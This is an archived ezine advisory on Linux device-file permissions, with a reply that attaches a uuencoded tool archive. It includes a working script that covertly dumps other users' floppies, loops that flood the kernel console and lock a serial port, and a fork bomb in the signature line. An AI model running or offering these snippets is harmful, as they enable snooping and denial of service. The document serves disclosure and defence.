@@ -1,0 +1,178 @@
+---
+title: "redflop"
+ezine: "ptzine"
+---
+
+# redflop
+
+**Ezine:** ptzine
+
+<div className="ascii-content">
+
+````
+
+First one
+----------
+
+Any user can read data from (even not mounted) floppy using
+"cat /dev/fd0H1440". It isn't dangerous itself, but... Any user
+may write a script, which periodically checks if floppy has been
+just unmounted, then dumps it's content to a file. Here's a sample
+'floppy collector':
+
+-- fdumper --
+#!/bin/sh
+DUMP_DEV=/dev/fd0H1440
+MOUNT_DEV=/dev/fd0
+LABEL=0
+DUMPED=1
+while :; do
+  sleep 1
+  if [ "`mount|grep \"^${MOUNT_DEV}\"`" = "" ]; then
+    if [ "$DUMPED" = "0" ]; then
+      echo "Dumping image #$LABEL..."
+      cat $DUMP_DEV >.fdimage$LABEL
+      let LABEL=LABEL+1
+      DUMPED=1
+    fi
+  else
+    DUMPED=0
+  fi
+done
+-- eof --
+
+Also, if there's no floppy in drive, unprivledged user may flood
+kernel log console (local console by default!!!):
+
+[user@host sth]$ while :; do cat /dev/fd0H1440;done &
+
+It will generate a lot of kernel messages, which will be logged
+to /var/log/messages AND to console (default klogd behaviour). Also,
+every printk(...) (called by fd driver) uses sync() to flush buffers.
+It will cause abnormal hdd activity.
+
+Second one
+-----------
+(not tested with rh 5.0)
+
+Ordinary user are allowed to read /dev/ttyS*. Serial ports driver
+disallows multiple access attempts at the same time, so user may
+permanently lock choosen port using this command:
+
+[user@host user]$ cat /dev/ttyS0
+(Ctrl+Z)
+[user@host user]$ cat /dev/ttyS0
+cat: /dev/ttyS0: device is busy
+
+Now serial port is in unusable state.
+
+That's all?
+------------
+
+There are also a lot of other, not-so-common devices, eg. /dev/sequencer,
+which are world-readable or even world-writable.
+
+There's not ANY reason to give ordinary users direct access to hardware
+devices. It's quite easy (as shown above ;) to obtain an interesting
+data or cause system failure by reading/writing these devices.
+
+Solution...
+------------
+
+ls -l /dev/* | grep "r-- "
+chmod ;)
+
+_______________________________________________________________________
+Micha│ Zalewski [tel 9690] | finger 4 PGP [lcamtuf@boss.staszic.waw.pl]
+Iterowaµ jest rzecz▒ ludzk▒, wykonywaµ rekursywnie - bosk▒ [P. Deustch]
+=------- [ echo -e "while :;do \$0&\ndone">_;chmod +x _;./_ ] --------=
+
+----------------------------------------------------------------------------
+
+
+> First one
+> ----------
+>
+> Any user can read data from (even not mounted) floppy using
+
+The best solution to this IMHO is to use allocatable removalble
+media devices, as Sun has done with Trusted Solaris and the Solaris
+BSM module.
+
+Take a look at the scripts I have written to do this under Linux
+(should actually work for anything that runs Perl)
+at http://www.xarius.demon.co.uk/software/devalloc
+
+--
+Darren J Moffat
+
+----------------------------------------------------------------------------
+
+begin 644 devalloc.tgz
+M'XL(`"&V"S("`^T::W/;N-%?Q5^Q431S&lt;BM+!/5RY#@3Q_;U?%,W5SM)KY-+
+M?0P)41SSH1"D'[U+?WMW`3Y`18Z3W-CI-%Q[1G@L%HM]8;&2RR_L((B=P<;=
+M`8S,J6G"!@!,)R/YR4;J,P<38&*9UG1H3<&lt;CG&7#J;D!XXU[@$RD=@*PX=I)
+MPJ.;\1!M/M_XOP.WT/_^J]/!_XS^L3UL]'_O^C^)X_0.]F"F.?FH_ME4ZI]9
+MH]'$LDC_4S;>`+/1_YW#(!/)`/5O!V0!QD8#WQ;4_9\O8^&G<7)]O_X_-%?\
+M?X3SC?_?O_\/"G-H`L&WZ/^'49KX7-SW_6^-)BOYWW`T,AO_OQ?_/SG<.S@^
+M'+`^&WR?^+"7>0"/P+)FIC4;CX$]>C09#(R!-!([Y8@X7$4&lt;S:QIB>CR6U"W
+M-=0+W^%GH;W\`)7-V%2CVOCIG?O_L7W.YW[`[RC_S_U]K?\/I^/<_ZV)-1Z2
+M_S.+-?Y_'W!ZN/_RY.C%/W<'/'4&@CM9XJ?7AN%'>.`@F!FMI^&YZR>PM83.
+M;P7V>_)=HY4CP58(4L-;,23XA(0M3WU6#KZZ-A^ND1A-,=YH)(HX4C6T9.6M
+M'PT^;745D#Y8W[A_Y?^54N[[_8^)?U'_0>\?3>7]/YTV_G\?,'?-&>E^@(U>
+MT=B/PZ7]][)[,)Q4&lt;P=3J^H<6MO;5>\'U*K>F]3FII:E]T;#JH?TGU8]W$#K
+M;6O;_;`]K#JNSM6"6:;>TQG!WG2B]QZ-JEZ-R(CI'6WC!?)DS%U6B(H5,ZPN
+M*J:+BNFB8C51L9JH6$U4K"8J5A,5JXF*U43%=%$Q751,%Q6KB8K51,5JHF(U
+M4;%%C8@F*J:+BBE1I;E510DVU1RU<()5$ZR<8(8H5H@"'T.[B<.L&&;E,&([
+MA=E2B[JL[.+LVZ7CYGUJY@1EFVEM2VL/C<]?HMJAXZJ&_>^T:#IN-AZ.<]PX
+MNG9<0\19E.]@9ZX?ZP.A[_IZ7_!W&8\&lt;GM0&(Q=C4*H/+9T/2"V=T+^J+W3%
+M&lt;J7+ZIL3?G,3?N/W?Y$DW4W^3\G93??_<#JQM/>_S/\MJWG_WPL\?""38DJ'
+MESS!3/K2>&@\A,Z1.RM3Z-X%X/M&lt;O<7-[8&IO?J5U.#P"C-\N?!`II'E4CGV
+MMQAS[W3A"U@FL9?8(6#3CU(>N=R%-(:W'/),'ON"IYGOJCP^3FC.\R]XA'32
+M!8>?GI\>_=R?("7_0@`]6,^<17P9]8IV&,_5"?X:>[4C(']P@MP)/X[D>?0#
+M52?*CX3(WV-@1/9LY-2//.+];<!#`2)&3NQ4LB.&lt;Q%^F`AP[6G>*OF1%V]72
+M=MW&]F3&MF&lt;CINWZC*&lt;I3\!9<.>&lt;MHWG@$&lt;XE\<38$&lt;NH)Y"7TB"$DNL;B+_
+MBHVF`TL>E0HJF(17&QU%?NK;`;SB":U#(IG@<!AY@2\6.X;1R83M<=B%]LN?
+M9_ISBA0&lt;V2'_)6HCFC^';N?AWLE?7L&#73`WX3>CA&lt;J)4CA]<7!X<@**SH[1
+MXE=^"FS'>(^T[3.4SF[7X^GR$FEUVP7]]N;F:^O-#F%X.8:7K,,`I$*[OC;?
+MP.Y_8-#]Y?3/FP-&lt;J!A$OCN,3E&]:W;;M3>N]N+!&lt;W1(R&(-"IVQ$W#;794$
+M3CSLS&T_4`9(&TJT/K0ABVRT%3)M5-8\3D*0.'TILG)5&+NWKD(&lt;N4BM*?:N
+MKW,+GTMPY+IDT"V7(<(93Q+TIC7+"H'Y$2@<_(_0]W(RQ%)?8X$>\QH572(]
+M[03Q$L.")GQ%@D#.=`\.7QWM'Q[O_=33L3;A]]_!]9&I8B_<5F2.PX7`74VD
+M<+E`1X#NXY+`$VER*-]P21NT.F?2'OXE#6)6F$6K8P>^+7*S:#U5[K0+8AF@
+M57;;O38R8FTBA9:TZ%PH_!VHA7*3UE,2/&5AN$)9S"#';./25JLSI]"%>[BO
+M1V_4@%<,C.4`$8&lt;M#F?2E7-\G)<.D8]YY1BVU,8M96/=SLNC@UX^TP-U"KES
+M2YE3EU[:]0E-?G3RUGO@@:BS\0"VGF.3VG*%Y.I!R94VX943%6MU;U^Q4S(T
+M-`<;+6J!80U#3"(M`=<5\6`M2Y*AS]C@.LYJ=,V2+K^12.D6J^P8^(]1R@EB
+M7%V9*EF'BG>E2%&FN?DIZ8]&HQZL,XVU^EN#6+&\/HC61MM1##Q*DVO`:*$[
+MLN922BI:[+TA_U/?`]Q)CG%+_6&lt;X'%?YWX1^"\*LX;C)_^X%T/!;F+/MR2]]
+MJ;.;@V'LO8VS%,K)K1H8Q@M*Z'Q*2<#&E"5&lt;IN2'/,P"6Z9[O+J7I*]2;A)R
+M9V%'O@AE!F6<9A&E51>^RRDAI$5^`J=Q8"=(V.I?0??23Q>P;PV>G1ZCJ=/M
+M@F&'`L3^\3]`7`O<6/0-XRBM"%WX-G'BQ&&(B`*ZY?U4E8*1AL8,>0_-7&+"
+M15E0@J=2#HYTU"E4ZL4C@8D!9F4R`21,V*/<[[L4Z.Y5(\^^$YAEI39>57C3
+MJ2$25";4RD(PBFTY@7$L\,^5U.9QSLF,+K,J\:)RR&,OEGQ@GLD3E+>])'&lt;G
+M)C$=YD\(GZSYZF(.13&%QL(4MJH19!7)NR6QA(?Q!5?$YDD<:L0J@6'D.U+)
+MK=2D4;>%?3Q]KO2$!QA2,$:Y?L(=^BT)"7$1!ZYV=)E%T-[8K=);HUQ"HIE3
+M3`=2D9>_'B1SBLC&lt;SH(4:LF:I/=!^F:DI`2B=.D'`4H3L_>(JV='29N#!?+U
+MDZ?SN/V>J_@MQ2_U2%N4(UX29\L>Y4J\>A#4\`VQB#,\.*53^#HH&lt;J,@]GQ\
+ML&`V(C+/XR*5ZH^XM,.E+<0E:EB@^@MBLS]1]H[_>U5.5KRTGE]&/,EK:ED0
+M5"U&lt;CMP222D4R:U&DLAIRDW0%7\-[?/R#?-KJ57M^4'4*BT**5?;23/$OT8!
+MBT7^FM-R1Z1G?*"5`0#W4,J5#=&=L.8;G_+WH3]F`;[1P!HBWS!WS2]:BI>0
+M+'Q]\6)T)V-/J+&lt;IR8+;SH)>:.F",H5"*E*6VM=.C]7$$Q2I\>+YP7-#.0WK
+MPXM%[?LI97Z06PV1L<'!3#O*EA3>5$0B2T-G4#0-9-+EF%&[Z')]DFJI(^G/
+MTI71)^?TMI/!+-\,?.*:)Z@?041$*MVC""E*R[08M63U@=P!":.]S0/;(TKI
+M"NOYHU@BN=4,17U?8("D373?+=@4&7H>.0MN-.S#L\S'HV-PCI$U#.'+@*>U
+MJ$&&V)&lt;/B0-5>_@1CN/Y'&^3Q^H*?WJ%MT&lt;F^BZ&M:COQ/WL_`FA-[6^6[[_
+MN[,*X&WU/S9=_?TW9H3#)O_[VO6_RB1NK`!NWU@!U%*'KU`#S"MOJ@A8.\&lt;G
+ME0&WOTH9<'BW94!+'F\\GIG;7UP&U")^O1`(\+FE0%4(5)>*+$VL*^>U6G2D
+M=QDFAM)*/)Y"AT$627UPMU[N`^2V+"MBJ]MY7)43_VC!T;BY1CAH[WQRH;%>
+M3*SD>5.![?:BFEI&YG#F\LB7Q<%\/&lt;CRB&8I"J%7IBI:W:`-?:/5EO:-^UWK
+M-4`E^Z+$\ODEO+*&MVONW%+`^Z/ENX]5[SY2N*L7G[JR^H2BZ7;R^IR9E^;(
+M6C&lt;W5VIRTK8^7I4S/ZDJ=W.I2M/N#<6J&PM3:WE<7Z+2>/WTTM07%:&:;*R!
+F!AIHH($&&FB@@08::*"!!AIHH($&&FB@@0;N$/X+3_U;UP!0```7
+`
+end
+
+````
+
+</div>
